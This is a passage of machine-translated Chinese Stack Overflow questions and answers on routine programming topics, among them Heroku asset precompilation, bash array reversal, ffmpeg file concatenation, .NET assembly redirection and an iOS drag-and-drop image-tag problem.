我刚刚开始使用asset_sync gem，我的资产似乎被乱序编译，Sass 文件无法访问其他 Sass 文件中定义的变量。真正能帮助我缩小问题范围的是能够准确地看到预编译期间发生了什么，但两者`rake assets:precompile`似乎`heroku run rake assets:precompile`都没有提供详细的选项。我得到的只是一些更高级别的输出，然后是一个`rake aborted!`和一个堆栈跟踪。跟踪 heroku 日志让我一无所获，那么我如何才能更详细地了解 Heroku 资产预编译期间发生的情况？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-11-15T01:58:15.203

事实证明，以下内容的组合会让您更加冗长。当一个文件被预编译时你会得到输出，但不是因为它正在被预编译，所以如果它挂起你就看不到它被阻塞了。

1.  使用 --trace 标志

    $ heroku run rake assets:precompile --trace

2.  在 production.rb 中设置日志以使用 STDOUT：

    config.logger = Logger.new(STDOUT)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-04-20T21:26:51.473

如果在资产预编译阶段部署失败并且您想要调试它，您可以通过添加一个空的`public/manifest.yml`. 这将允许您`$heroku run rake assets:precompile --trace`按照@Pedr 在他的回答中描述的方式运行。

请参阅[是否可以跳过 Heroku 上的单个 git push 的资产预编译步骤？](https://stackoverflow.com/questions/11596912/is-it-possible-to-skip-the-asset-precompile-step-for-a-single-git-push-on-heroku)更多细节。

# css - 有没有办法在每个浏览器上打印相同的网站？

> ID：13360086
> 
> 赞同：2
> 
> 时间：2012-11-13T11:37:44.223
> 
> 标签：css, firefox, printing, explorer

我有一个仅包含文本（字体大小和字体系列）的网站。字体大小以 mm 为单位，使用的字体为 Times New Roman、Arial 和 Courier New。

当我在所有主流浏览器中打印网站时，每个浏览器都会做其他事情。我关闭了缩放功能。

我做错了什么还是不可能有一个（非常）简单的网页在每个浏览器的纸上看起来都一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:47:40.473

对于打印，您可以设置浏览器仅在打印时使用的特定样式表 - 这里有一些很好的资源：

[http://www.webdesignerdepot.com/2010/01/10-tips-for-better-print-style-sheets/](http://www.webdesignerdepot.com/2010/01/10-tips-for-better-print-style-sheets/) - 这特别好，尤其是关于包含完整链接的部分

`a:link:after { content: " (" attr(href) ") "; }`

[http://coding.smashingmagazine.com/2011/11/24/how-to-set-up-a-print-style-sheet/](http://coding.smashingmagazine.com/2011/11/24/how-to-set-up-a-print-style-sheet/)

那里有一些媒体查询的使用，但是包含特定样式表以进行打印的基本方法是这样的：

```
<link rel="stylesheet" type="text/css" media="print" href="print.css" /> 
```

好的做法是尽可能多地去掉文章周围的内容，只给用户他们想要的东西——简单的样式也更容易在浏览器中工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:40:13.657

在一天结束时没有。你可以接近它，但它不一定是一样的。

编辑：

既然我投了反对票，让我解释一下：没有保证可以做到这一点。每个浏览器和版本都会有所不同，并且无法*保证*网页在每个浏览器中的外观或打印效果都相同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T11:42:39.907

首先添加一个“reset css”以将所有浏览器设置为一个共同的起点。搜索“reset css”应该提供多种。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:01:10.727

关于您的评论并作为部分答案，请始终仅使用免费字体。例如[Times New Roman](http://en.wikipedia.org/wiki/Times_New_Roman)不是（作为一个 linux 用户我没有它），应该首选 Liberation Serif（就像 Arial 应该被 Liberation Sans Narrow 取代）。

要在字体方面获得更多风格自由，您可以使用[Google Fonts](https://developers.google.com/webfonts/)。

另请注意，在浏览器显示和打印中，您的表单中不可能有完全相同的输入。

当我想要一个完全符合您需要的打印版本（包括关于分页）时，我添加了一个链接来构建我的页面的 PDF 版本。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-13T11:50:29.733

当我们需要一个用户将打印的页面时，我们必须制作一个完全独立的 html 文件，该文件使用旧的基于表格的布局 a `reset.css`，并且仍然存在一些差异（例如 Chrome 中的边距比 IE 上的小）。它很丑（主要是因为基于表格的布局），但是这样尺寸和布局至少是相同的。

# meteor - Meteor 服务器上的请求 URL

> ID：13360087
> 
> 赞同：4
> 
> 时间：2012-11-13T11:37:49.233
> 
> 标签：meteor

有没有办法知道请求来自 Meteor 服务器上的哪个 URL？

具体来说，我想`Meteor.publish`根据请求的 URL 参数过滤方法。在服务器上执行此操作比从客户端发送参数更安全`Meteor.subscribe`，因为客户端变量可能被黑客入侵。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T14:37:00.347

刚刚发现至少在`Meteor.publish`函数内部你可以从`this.session.socket.headers`.

# bash - 如何在 bash onliner FOR 循环中反转数组？

> ID：13360091
> 
> 赞同：54
> 
> 时间：2012-11-13T11:38:05.373
> 
> 标签：bash

如何反转为定义的数组执行 for 循环的顺序

要遍历数组，我正在这样做：

```
$ export MYARRAY=("one" "two" "three" "four")
$ for i in ${MYARRAY[@]}; do echo $i;done
one
two
three
four 
```

有没有可以反转数组顺序的功能？

我的一个想法是生成一个倒排索引序列并使用这个倒排索引调用元素，但也许有更快的选择，或者至少更容易阅读。

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-11-13T11:44:35.557

您可以使用 C 风格的 for 循环：

```
for (( idx=${#MYARRAY[@]}-1 ; idx>=0 ; idx-- )) ; do
    echo "${MYARRAY[idx]}"
done 
```

对于带有“孔”的数组，元素的数量`${#arr[@]}`与最后一个元素的索引不对应。您可以创建另一个索引数组并以相同的方式将其向后移动：

```
#! /bin/bash
arr[2]=a
arr[7]=b

echo ${#arr[@]}  # only 2!!

indices=( ${!arr[@]} )
for ((i=${#indices[@]} - 1; i >= 0; i--)) ; do
    echo "${arr[indices[i]]}"
done 
```

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2012-11-13T11:51:44.533

您可以使用[tac](http://en.wikipedia.org/wiki/Tac_%28Unix%29)，这与`cat`它反转线条的意义相反。

```
MYARRAY=("one" "two" "three" "four")
for item in "$MYARRAY"; do
   echo "$item"; 
done | tac

# four
# three
# two
# one 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-03-21T12:18:03.117

```
_arr+=( '"${_arrev} is an actual "${array[@]}"' )  ⏎
_arr+=( '"${_arrev} is created as a result"' )
_arr+=( '"of reversing the key order in"' )
_arr+=( '"this "${_arr}. It handles zsh and"' )
_arr+=( '"bash arrays intelligently by tracking"' )
_arr+=( '"shell "$ENV." quotes=fine ( i hope ) "' )

. <<REVERSE /dev/stdin                    ⏎
    _arrev=( $(: $((l=${#_arr[@]}${ZSH_VERSION++1})) ; printf '"${_arr[$(('$l'-%d))]}" ' `seq 1 $l`) )
REVERSE

echo ; printf %s\\n ${_arrev}

"shell "$ENV." quotes=fine ( i hope ) "
"bash arrays intelligently by tracking"
"this "${_arr}. It handles zsh and"
"of reversing the key order in"
"${_arrev} is created as a result"
"${_arrev} is an actual "${array[@]}" 
```

我认为这应该处理任何可能的数组。

如果你对上面发生的事情感兴趣，我建议你先看看[这里](https://unix.stackexchange.com/questions/120528/how-to-define-similar-bash-function-at-once/120531#120531)。那么也许[在这里](https://unix.stackexchange.com/questions/120475/how-can-i-pass-argument-stored-on-a-variable-to-wget/120487#120487)，肯定[在这里](https://unix.stackexchange.com/a/119845/52934)，如果你有时间，[这里](https://unix.stackexchange.com/a/120863/52934)和[这里](https://unix.stackexchange.com/questions/120736/parsing-process-command-line-arguments-from-pargs-in-a-shell-script/120817#120817)。

在所有这些答案中，我讨论了此处文档*（以及许多其他方面）*的不同方面，您可以利用这些方面来发挥自己的优势。例如，我讨论了两次评估变量，这是在上面完成的，其中一个声明了一个函数，该函数全局声明了另一个*`"_$1"`*仅用 5 或 6 行命名的函数——其中大部分是*`_$1() { func body ; }`.* 如果您正确使用它，它会非常方便。

关于井之间的自动切换*`bash/zsh,`* 是另一回事，但也很简单。见[这里](https://unix.stackexchange.com/questions/81457/trapping-errors-in-command-substitution-using-o-errtrace-ie-set-e/120008#120008)。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-04-16T23:50:06.183

这个怎么样：

```
for i in `printf '%s\n' "${MYARRAY[@]}"|tac`; do echo $i; done 
```

输出是：

```
four
three
two
one 
```

限制：如果数组包含换行符则不起作用。作为一种解决方法，您可以实现以下功能：

```
reverse(){ reversed=();local i;for ((i=$#;i>0;i--)); do reversed+=("${!i}");done; } 
```

并以这种方式使用它：

```
reverse "${MYARRAY[@]}" && for i in "${reversed[@]}"; do echo $i; done 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-08-26T00:23:01.410

像字符串一样简单：

```
% unset c; a="1 2 3 4 5"; for b in $a; do c="$b $c"; done; echo $c 
```

5 4 3 2 1

你确定你想要数组语法？？：

```
 % unset c; declare -a c; a=(1 2 3 4 5); i=0; for b in ${a[*]}; \
    do c[$((${#a[@]}-$i))]=$b; i=$(($i+1)); done; echo ${c[*]} 
```

5 4 3 2 1

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-08-25T22:17:53.757

如果您正在谈论一个顺序数字数组（例如删除 bash 历史记录），您可以以相反的顺序列出它，例如：

```
for i in {16..10}; do history -d $i; done 
```

我意识到这有点离题，对此我深表歉意，但我认为这可能值得一提。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-08-18T07:58:05.790

我建议限制此类事情的单行使用，而是编写一个源自您的 shell 或脚本的函数。这是较新版本的 Bash 的示例，其中可以通过引用函数来传递多个数组...

```
reverse_array(){
  local -n _source_array_ref="${1}"
  local -n _destination_array_ref="${2}"

  for ((_index=${#_source_array_ref[@]}-1; _index>=0; _index--)); do
    _destination_array_ref+=("${_source_array_ref[$_index]}")
  done
}

_list=(spam ham space)
_new_list=()

reverse_array '_list' '_new_list'

printf '%s\n' "${_new_list[@]}"
#> space
#> ham
#> spam 
```

...但是，使用此技术时请注意，它会生成一个*不纯*的函数（具有副作用），这意味着在 Bash 脚本思维方式中调试`_list`或`_new_list`可能变得困难......当前的示例也没有考虑到可以重新运行`reverse_array`并最终`_new_list`附加到多次；这可能需要也可能不需要。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-12-04T17:36:28.550

你也可以考虑使用`seq`

```
MYARRAY=("one" "two" "three" "four")

for i in $(seq $((${#MYARRAY[@]} - 1)) -1 0); do
    echo ${MYARRAY[$i]}
done 
```

在 freebsd 中你可以省略 -1 increment 参数：

```
for i in $(seq $((${#MYARRAY[@]} - 1)) 0); do
    echo ${MYARRAY[$i]}
done 
```

# servicestack - 对象的 HTTP GET 方法参数格式

> ID：13360098
> 
> 赞同：2
> 
> 时间：2012-11-13T11:38:36.250
> 
> 标签：servicestack

如果请求不包含原始对象，我可以使用 GET 方法通过 http 参数设置我的请求对象吗？我可以使用 json 对 POST 方法执行此操作，但是否存在一些 GET 替代方法？

```
[DataContract]
[RestService("/foo")]    
public class FooRequest  
{
    [DataMember]
    public string Color1 { get; set; }

    [DataMember]
    public FooDto Dto { get; set; }

}

public class FooDto
{
    public string Color2 { get; set;}
} 
```

在此示例中设置了 Color1，但如何设置 Dto.color2？

```
http://server/fooservice/servicestack/foo?Color1=blue&Dto.Color2=red 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T17:28:51.397

在[ServiceStack](http://www.servicestack.net)中，您可以使用[JSV 格式](https://github.com/ServiceStack/ServiceStack.Text/wiki/JSV-Format)在 QueryString 上设置复杂类型属性。[有关示例，](https://stackoverflow.com/a/13277036/85785)请参见此较早的答案。

因此，要设置 Complex Type **Dto**属性，您的 queryString 将如下所示：

```
http://server/fooservice/servicestack/foo?Color1=blue&Dto={Color2:red} 
```

# bash - 在 BASH 脚本中连接视频文件后报告错误的视频时长

> ID：13360099
> 
> 赞同：0
> 
> 时间：2012-11-13T11:38:37.520
> 
> 标签：bash, video, ffmpeg

我正在尝试使用 ffmpeg 将三个视频文件（每个 16 秒长）合并到一个文件中。由于它们是 mpeg 格式，我只是尝试使用`cat`命令将它们连接到一个文件中。问题是当我运行生成的文件 ( `video.mpg`) 时，它被报告为大约 16 秒长（与第一个连接的视频相同）。有趣的是，当我在 VLC 中播放文件时，我可以观看整个 48 秒的视频，即使视频进度条也最多只报告 16 秒。

`cat`在使用命令添加另外两个视频后，文件“属性”（例如持续时间等）似乎没有更新。

希望有任何关于我如何解决这个问题的建议。

以下是我创建的 BASH 脚本的相关部分：

```
mkfifo intermediate1.mpg
mkfifo intermediate2.mpg
mkfifo intermediate3.mpg
ffmpeg -i "./tmp/final01.mp4" -qscale 1 -y intermediate1.mpg < /dev/null &
ffmpeg -i "./tmp/final02.mp4" -qscale 1 -y intermediate2.mpg < /dev/null &
ffmpeg -i "./tmp/final03.mp4" -qscale 1 -y intermediate3.mpg < /dev/null &

echo "[audioforge] Stitching files "
cat intermediate1.mpg >> ./tmp/video.mpg
cat intermediate2.mpg >> ./tmp/video.mpg
cat intermediate3.mpg >> ./tmp/video.mpg

# Convert back to mp4 format.
ffmpeg -i "./tmp/video.mpg" -qscale 1 -y "./tmp/video.mp4" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:18:29.440

看起来您还没有“等待”所有转换完成。

在 3 行 ffmpeg 之后使用命令`wait`（那些行，在后台运行）我不确定确切的语法，但很容易理解。

另外，你必须只使用fifo吗？你可以在 /tmp 中使用一个简单的文件；除非它会占用一个非常大的空间。

编辑：由于 fifo 固有的阻塞 I/O 特性，可能不需要等待命令；但是，正因为如此，您无法在并行转换 3 个文件时实现所需的并行性。在转换输出文件的前 4k（或任何您的 fifo 大小）后，2（第 2 和第 3）个转换命令将停止，直到从 fifo 读取数据。

# javascript - 带有'？x = y'查询的jQuery BBQ推送状态

> ID：13360102
> 
> 赞同：1
> 
> 时间：2012-11-13T11:38:51.070
> 
> 标签：javascript, jquery-bbq

我一直在使用[http://benalman.com/projects/jquery-bbq-plugin/](http://benalman.com/projects/jquery-bbq-plugin/)推送并对 URL 做出反应（AJAX 加载的 URLS）...

目前我有这样的网址：

```
article/category/specific -> http://mypage.com/#article/category/specific
article/single/id -> http://mypage.com/#article/single/id 
```

等等，效果真的很好……

现在我需要使用一些参数来进一步增强它，比如 ?l=http://mypage.com/whereicamefrom

这是针对非常特殊的情况，我希望用户可以存储/收藏当前 url，但需要知道该 url 从哪里开始。特别是当 URL 通过其他方式更改时，用户单击链接等...

就像执行搜索一样，因为搜索会生成以下 url：

```
search/query -> http://mypage.com/#search/query

//I Would like (): 
search/query -> http://mypage.com/#search/query?l=article/category/specific
search/query -> http://mypage.com/#search/query?l=article/single/id
//(Depending on where you came from) 
```

但是，如果我只是尝试使用 'search/query?l=article/single/id' 推送状态，？转换为“%3F”...

**哈！！！！！！没关系...由于另一件事，这不起作用，我在尝试推送页面搜索的哈希开头错过了一个“#”...哦，上帝...好东西，输入您的问题可以让你的想法脱离你所坐的圈子。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:46:04.593

**哈！！！！！！没关系...由于另一件事，这不起作用，我在尝试推送页面搜索的哈希开头错过了一个“#”...哦，上帝...好东西，输入您的问题可以让你的想法脱离你所坐的圈子。**

所以我推：'search/query?l=article/single/id" 我应该推到哪里：'#search/query?l=article/single/id"

然后它起作用了......（我现在觉得有点愚蠢）

# c# - 使用不同的 publicKeyToken 升级参考 .Net dll

> ID：13360103
> 
> 赞同：2
> 
> 时间：2012-11-13T11:38:58.787
> 
> 标签：c#, .net, configuration, .net-assembly

我必须在我的项目中使用一些引用程序集 XXXXX 的 dll 文件。我现在在我的项目中有这个程序集的更新版本，但是当我运行我的项目时，我得到了错误：`Could not load file or assembly XXXXX, Version=XXXXX`. 我尝试使用[MSDN 文章 Redirecting Assembly Versions](http://msdn.microsoft.com/en-us/library/7wd6ex19%28VS.71%29.aspx)解决此问题。但这无济于事。似乎重定向程序集不起作用，因为我有不同的公共令牌密钥。它`null`在旧组件中。但它在较新的程序集中有一些价值“xxxxxxxxxxx”。如何解决这个问题？

PS 类似的问题在[这里](https://stackoverflow.com/questions/1461565/upgrade-a-reference-dll-in-a-c-sharp-project-without-recompiling-the-project)。但不同之处在于我有不同的公共令牌密钥。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:44:03.527

您将需要获取针对新版本 XXXXX 构建的新版本的 dll 文件。

[您可以在http://msdn.microsoft.com/en-us/library/yx7xezcf.aspx](http://msdn.microsoft.com/en-us/library/yx7xezcf.aspx)中了解有关程序集查找的更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:53:58.453

共享 dll 中的公钥应保护应用程序免受“中间人/dll”攻击。

当当前 sub.dll 的公钥与编译 main.exe 时的公钥不同时，dot net 运行时正确地拒绝使用 sub.dll 启动 main.exe。

要解决这个问题，你可以

*   用新的 sub.dll 重新编译 main.exe
*   确保 sub.dll 的两个版本都使用相同的公钥编译。在您的情况下，您可以从 sub.dll 中删除公钥（即使用[ilmerge](http://www.microsoft.com/en-us/download/details.aspx?id=17630)），因为旧的 sub.dll 没有密钥。

# iphone - 使用 UIImageTags 以供以后在不同的 ViewController 中使用？Objective-C

> ID：13360107
> 
> 赞同：-2
> 
> 时间：2012-11-13T11:39:15.367
> 
> 标签：iphone, objective-c, ios, xcode, uiimageview

我有一个项目，其中有一个带有 6 个图像的 Horizo​​ntal UIScrollView，所有图像都填充了自定义图像。

当我将图像从 UIScrollView 拖放到视图顶部的 HeaderImage 上时。它更改了我将图像从 ScrollView 拖放到的区域的 Headerimage。

现在我的挑战是我的 UIScrollView 中有多个不同的图像，但是当我将 UIScrollView 中的任何图像拖放到 HeaderImage 区域时，它们都会变为相同的图像。

如何设置 UIImage 标签，以便在设置 UIScrollView 图像时保存图像，以便在拖放到 HeaderImage 区域时显示正确的图像或不同的图像。

基本上我希望能够根据 ScrollView 中的哪个图像拖放到 HeaderImage 上来更改它。

以下是我的代码：

非常感谢任何帮助。

多谢你们。我真的很感谢所有给予我的巨大帮助。

![在此处输入图像描述](../Images/551a521bf8ba35636fc5238a68dbc6b3.png) ![在此处输入图像描述](../Images/66a55ba588c883305534aeada4c9de29.png)

我为 GalleryScrollView.m 中的滚动视图设置了我的图像

```
- (void) addAttachment:(AttachmentItem *)attachment
{
// SAVE ATTACHMENT
[_attachments addObject:attachment];

// RESIZE CONTENT VIEW FOR INSERTINT NEW ATTACHMENT
_scrollView.contentSize = CGSizeMake([_attachments count]*70, 70);

CGFloat startX = (70.0f * ((float)[_attachments count] - 1.0f) + padding);
CGFloat startY = 370;
CGFloat width = 64;
CGFloat height = 64;

GalleryButton *btnAttachment = [[GalleryButton alloc] initWithFrame:CGRectMake(startX, startY, width, height)];
btnAttachment.tag = [_attachments count];
btnAttachment.scrollParent = _scrollView;
btnAttachment.mainView = self.mainView;
btnAttachment.delegate = self;

if (attachment.type == 1){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"canadian-maple.png"];
    [btnAttachment addSubview:imageView];
    int tag = btnAttachment.tag;
    NSLog(@"%d", tag);
    [imageView release];
}else if (attachment.type == 2){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"mozambique-wenge.png"];
    [btnAttachment addSubview:imageView];
    int tag = btnAttachment.tag;
     NSLog(@"%d", tag);
    [imageView release];
} else if (attachment.type == 3){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"canadian-maple.png"];
    [btnAttachment addSubview:imageView];
    int tag = btnAttachment.tag;
    NSLog(@"%d", tag);
    [imageView release];
}
else if (attachment.type == 4){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"mozambique-wenge.png"];
    [btnAttachment addSubview:imageView];
    int tag = btnAttachment.tag;
    NSLog(@"%d", tag);
    [imageView release];
}
else if (attachment.type == 5){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"canadian-maple.png"];
    [btnAttachment addSubview:imageView];
    int tag = btnAttachment.tag;
    NSLog(@"%d", tag);
    [imageView release];
}
else if (attachment.type == 6){
    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 64, 64)];
    imageView.image=[UIImage imageNamed:@"mozambique-wenge.png"];
    [btnAttachment addSubview:imageView];
    int tag = btnAttachment.tag;
    NSLog(@"%d", tag);
    [imageView release];
}

[_scrollView addSubview:btnAttachment];
[btnAttachment release];

} 
```

并在 HegakaDragAndDropRecycleBinViewController.m 中将它们添加到我的视图中

```
- (void)viewDidLoad
{
[super viewDidLoad];
self.gallery.mainView = self.view;

AttachmentItem *item = [[AttachmentItem alloc] initWithData:1 data:nil];
[self.gallery addAttachment:item];
[item release];

AttachmentItem *item2 = [[AttachmentItem alloc] initWithData:2 data:nil];
[self.gallery addAttachment:item2];
[item2 release];

AttachmentItem *item3 = [[AttachmentItem alloc] initWithData:3 data:nil];
[self.gallery addAttachment:item3];
[item3 release];

AttachmentItem *item4 = [[AttachmentItem alloc] initWithData:4 data:nil];
[self.gallery addAttachment:item4];
[item4 release];

AttachmentItem *item5 = [[AttachmentItem alloc] initWithData:5 data:nil];
[self.gallery addAttachment:item5];
[item5 release];

AttachmentItem *item6 = [[AttachmentItem alloc] initWithData:6 data:nil];
[self.gallery addAttachment:item6];
[item6 release];
} 
```

并在此处添加 TouchesEnded 的动作

```
-(void) touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {

if ([delegate isInsideRecycleBin:self touching:YES]){

    CGRect myImageRect = CGRectMake(0, 0, 320, 300);
    headerImage = [[UIImageView alloc] initWithFrame:myImageRect];
    [headerImage setImage:[UIImage imageNamed:@"light-cherry.png"]];
    [self.mainView addSubview:headerImage];

    UIImageView * animation = [[UIImageView alloc] init];
    animation.frame = CGRectMake(self.center.x - 32, self.center.y - 32, 40, 40);

    animation.animationImages = [NSArray arrayWithObjects:
                                 [UIImage imageNamed: @"iconEliminateItem1.png"],
                                 [UIImage imageNamed: @"iconEliminateItem2.png"],
                                 [UIImage imageNamed: @"iconEliminateItem3.png"],
                                 [UIImage imageNamed: @"iconEliminateItem4.png"]
                                 ,nil];
    [animation setAnimationRepeatCount:1];
    [animation setAnimationDuration:0.35];
    [animation startAnimating];
    [self.mainView addSubview:animation];
    [animation bringSubviewToFront:self.mainView];
    [animation release];
    ;
    [UIView beginAnimations:@"goback" context:nil];
    [UIView setAnimationDuration:0.4f];
    [UIView setAnimationBeginsFromCurrentState:YES];
    self.center = _originalOutsidePosition;
    [UIView setAnimationDelegate:self];
    [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
    //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
    [UIView commitAnimations];

} else{
    [UIView beginAnimations:@"goback" context:nil];
    [UIView setAnimationDuration:0.4f];
    [UIView setAnimationBeginsFromCurrentState:YES];
    self.center = _originalOutsidePosition;
    [UIView setAnimationDelegate:self];
    [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
    //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
    [UIView commitAnimations];

}

[self.delegate touchUp]; 
```

好吧，也许我在正确的轨道上。如果这是要走的路，请有人指导我，所以我补充说：

```
-(void) touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {

switch ([delegate isInsideRecycleBin:self touching:YES]) {
    case 1:{

        CGRect myImageRect = CGRectMake(0, 0, 320, 300);
        headerImage = [[UIImageView alloc] initWithFrame:myImageRect];
        [headerImage setImage:[UIImage imageNamed:@"mozambique-wenge.png"]];
        headerImage.backgroundColor = [UIColor blackColor];
        headerImage.layer.borderWidth = 2;
        headerImage.layer.borderColor = [UIColor blackColor].CGColor;
        headerImage.layer.masksToBounds = YES;
        headerImage.layer.cornerRadius = 5;
        [self.mainView addSubview:headerImage];

        UIImageView * animation = [[UIImageView alloc] init];
        animation.frame = CGRectMake(self.center.x - 32, self.center.y - 32, 40, 40);

        animation.animationImages = [NSArray arrayWithObjects:
                                     [UIImage imageNamed: @"iconEliminateItem1.png"],
                                     [UIImage imageNamed: @"iconEliminateItem2.png"],
                                     [UIImage imageNamed: @"iconEliminateItem3.png"],
                                     [UIImage imageNamed: @"iconEliminateItem4.png"]
                                     ,nil];
        [animation setAnimationRepeatCount:1];
        [animation setAnimationDuration:0.35];
        [animation startAnimating];
        [self.mainView addSubview:animation];
        [animation bringSubviewToFront:self.mainView];
        [animation release];
        ;
        [UIView beginAnimations:@"goback" context:nil];
        [UIView setAnimationDuration:0.4f];
        [UIView setAnimationBeginsFromCurrentState:YES];
        self.center = _originalOutsidePosition;
        [UIView setAnimationDelegate:self];
        [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
        //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
        [UIView commitAnimations];

        }

        break;
    case 2:{

        CGRect myImageRect = CGRectMake(0, 0, 320, 300);
        headerImage = [[UIImageView alloc] initWithFrame:myImageRect];
        [headerImage setImage:[UIImage imageNamed:@"recyclebin.png"]];
        headerImage.backgroundColor = [UIColor blackColor];
        headerImage.layer.borderWidth = 2;
        headerImage.layer.borderColor = [UIColor blackColor].CGColor;
        headerImage.layer.masksToBounds = YES;
        headerImage.layer.cornerRadius = 5;
        [self.mainView addSubview:headerImage];

        UIImageView * animation = [[UIImageView alloc] init];
        animation.frame = CGRectMake(self.center.x - 32, self.center.y - 32, 40, 40);

        animation.animationImages = [NSArray arrayWithObjects:
                                     [UIImage imageNamed: @"iconEliminateItem1.png"],
                                     [UIImage imageNamed: @"iconEliminateItem2.png"],
                                     [UIImage imageNamed: @"iconEliminateItem3.png"],
                                     [UIImage imageNamed: @"iconEliminateItem4.png"]
                                     ,nil];
        [animation setAnimationRepeatCount:1];
        [animation setAnimationDuration:0.35];
        [animation startAnimating];
        [self.mainView addSubview:animation];
        [animation bringSubviewToFront:self.mainView];
        [animation release];
        ;
        [UIView beginAnimations:@"goback" context:nil];
        [UIView setAnimationDuration:0.4f];
        [UIView setAnimationBeginsFromCurrentState:YES];
        self.center = _originalOutsidePosition;
        [UIView setAnimationDelegate:self];
        [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
        //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
        [UIView commitAnimations];

        }
    }
    } 
```

但没有什么大事发生

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T21:18:37.033

GalleryButton（一个`UIView`子类本身）正在处理触摸。标记是 a 的属性`UIView`。这意味着标签已经为您准备好了：

```
-(void) touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {

    if ([delegate isInsideRecycleBin:self touching:YES]){
        // Log drag to recycle bin (or as you are calling it the header image view)
        NSLog(@"View with tag %i was dragged to the recycle bin",self.tag);

        ..... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T09:13:12.473

我会回答我自己的问题。经过数周尝试不同的方法。原来我所要做的就是使用这段代码。感谢@NJones 让我走上了正轨。

```
-(void) touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {
if ([delegate isInsideRecycleBin:self touching:YES]){

    if (self.tag == 1) {

        NSLog(@"View with tag %i was dropped onto trigger area",self.tag);

        CGRect myImageRect = CGRectMake(0, 0, 320, 300);
        headerImage = [[UIImageView alloc] initWithFrame:myImageRect];
        [headerImage setImage:[UIImage imageNamed:@"light-cherry.png"]];
        headerImage.backgroundColor = [UIColor blackColor];
        headerImage.layer.borderWidth = 2;
        headerImage.layer.borderColor = [UIColor blackColor].CGColor;
        headerImage.layer.masksToBounds = YES;
        headerImage.layer.cornerRadius = 5;
        [self.mainView addSubview:headerImage];

    }
    else if (self.tag == 2)
    {

        NSLog(@"View with tag %i was dropped onto trigger area",self.tag);

        CGRect myImageRect = CGRectMake(0, 0, 320, 300);
        headerImage = [[UIImageView alloc] initWithFrame:myImageRect];
        [headerImage setImage:[UIImage imageNamed:@"mozambique-wenge.png"]];
        headerImage.backgroundColor = [UIColor blackColor];
        headerImage.layer.borderWidth = 2;
        headerImage.layer.borderColor = [UIColor blackColor].CGColor;
        headerImage.layer.masksToBounds = YES;
        headerImage.layer.cornerRadius = 5;
        [self.mainView addSubview:headerImage];
    }
    UIImageView * animation = [[UIImageView alloc] init];
    animation.frame = CGRectMake(self.center.x - 32, self.center.y - 32, 40, 40);

    animation.animationImages = [NSArray arrayWithObjects:
                                 [UIImage imageNamed: @"iconEliminateItem1.png"],
                                 [UIImage imageNamed: @"iconEliminateItem2.png"],
                                 [UIImage imageNamed: @"iconEliminateItem3.png"],
                                 [UIImage imageNamed: @"iconEliminateItem4.png"]
                                 ,nil];
    [animation setAnimationRepeatCount:1];
    [animation setAnimationDuration:0.35];
    [animation startAnimating];
    [self.mainView addSubview:animation];
    [animation bringSubviewToFront:self.mainView];
    [animation release];
    ;
    [UIView beginAnimations:@"goback" context:nil];
    [UIView setAnimationDuration:0.4f];
    [UIView setAnimationBeginsFromCurrentState:YES];
    self.center = _originalOutsidePosition;
    [UIView setAnimationDelegate:self];
    [UIView setAnimationDidStopSelector: @selector(animationDidStop:finished:context:)];
    //        loadingView.frame = CGRectMake(rect.origin.x, rect.origin.y - 80, rect.size.width, rect.size.height);
    [UIView commitAnimations];

} else{
    [UIView beginAnimations:@"goback" context:nil];
    [UIView setAnimationDuration:0.4f];
    [UIView setAnimationBeginsFromCurrentState:YES];
    self.center = _originalOutsidePosition;
    [UIView setAnimationDelegate:self];
